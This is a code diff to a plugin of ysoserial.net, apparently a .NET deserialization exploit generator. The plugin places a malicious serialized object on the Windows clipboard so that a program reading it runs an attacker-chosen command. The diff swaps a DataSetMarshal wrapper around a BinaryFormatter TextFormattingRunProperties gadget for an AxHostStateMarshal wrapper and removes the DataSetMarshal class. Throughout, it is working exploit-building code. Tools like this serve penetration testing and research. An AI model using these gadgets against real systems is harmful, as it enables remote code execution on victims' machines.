@@ -33,7 +33,7 @@ namespace ysoserial.Plugins
 
         static OptionSet options = new OptionSet()
             {
-                {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: Serializable (the only one that works in Feb 2020 as a result of an incomplete silent patch probably?)", v => format = v },
+                {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: Serializable (the only one that works in Feb 2020 as a result of an incomplete silent patch - - will not be useful to target text based fields anymore)", v => format = v },
                 {"c|command=", "the command to be executed", v => command = v },
                 {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
@@ -73,7 +73,7 @@ namespace ysoserial.Plugins
                 try
                 {
                     extra = options.Parse(args);
-                    inputArgs.CmdFullString = command;
+                    inputArgs.Cmd = command;
                     inputArgs.Minify = minify;
                     inputArgs.UseSimpleType = useSimpleType;
                     inputArgs.Test = test;
@@ -95,16 +95,13 @@ namespace ysoserial.Plugins
                     System.Environment.Exit(-1);
                 }
 
-                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
-                MemoryStream ms = new MemoryStream(serializedData);
-                DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(ms);
-
                 // Creates a new data object.
-                DataObject myDataObject = new DataObject();
+                System.Windows.Forms.DataObject myDataObject = new System.Windows.Forms.DataObject();
 
-                myDataObject.SetData(format, false, payloadDataSetMarshal); // for System.Windows.Forms
+                myDataObject.SetData(format, false, new AxHostStateMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs))); // for System.Windows.Forms
+
                 /*
-                myDataObject.SetData(format, payloadDataSetMarshal, false); // for System.Windows
+                myDataObject.SetData(format, new DataSetMarshal(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs)), false); // for System.Windows
                 */
 
                 Clipboard.Clear();
@@ -118,7 +115,10 @@ namespace ysoserial.Plugins
                         IDataObject dataObj = Clipboard.GetDataObject();
                         Object test = dataObj.GetData(format);
                     }
-                    catch { }
+                    catch (Exception err)
+                    {
+                        Debugging.ShowErrors(inputArgs, err);
+                    }
                 }
             });
             staThread.SetApartmentState(ApartmentState.STA);
@@ -126,48 +126,6 @@ namespace ysoserial.Plugins
             staThread.Join();
 
             return "Object copied to the clipboard";
-        }
-
-        
-        // Reference: https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
-        [Serializable]
-        public class DataSetMarshal : ISerializable
-        {
-            object _fakeTable;
-            MemoryStream _ms;
-            public void GetObjectData(SerializationInfo info, StreamingContext context)
-            {
-                info.SetType(typeof(System.Data.DataSet));
-                info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
-                info.AddValue("DataSet.DataSetName", "");
-                info.AddValue("DataSet.Namespace", "");
-                info.AddValue("DataSet.Prefix", "");
-                info.AddValue("DataSet.CaseSensitive", false);
-                info.AddValue("DataSet.LocaleLCID", 0x409);
-                info.AddValue("DataSet.EnforceConstraints", false);
-                info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
-                info.AddValue("DataSet.Tables.Count", 1);
-                MemoryStream stm = new MemoryStream();
-                if (_fakeTable != null)
-                {
-                    BinaryFormatter fmt = new BinaryFormatter();
-                    fmt.Serialize(stm, _fakeTable);
-                }
-                else
-                {
-                    stm = _ms;
-                }
-                info.AddValue("DataSet.Tables_0", stm.ToArray());
-            }
-
-            public DataSetMarshal(object fakeTable)
-            {
-                _fakeTable = fakeTable;
-            }
-            public DataSetMarshal(MemoryStream ms)
-            {
-                _ms = ms;
-            }
         }
     }
 }
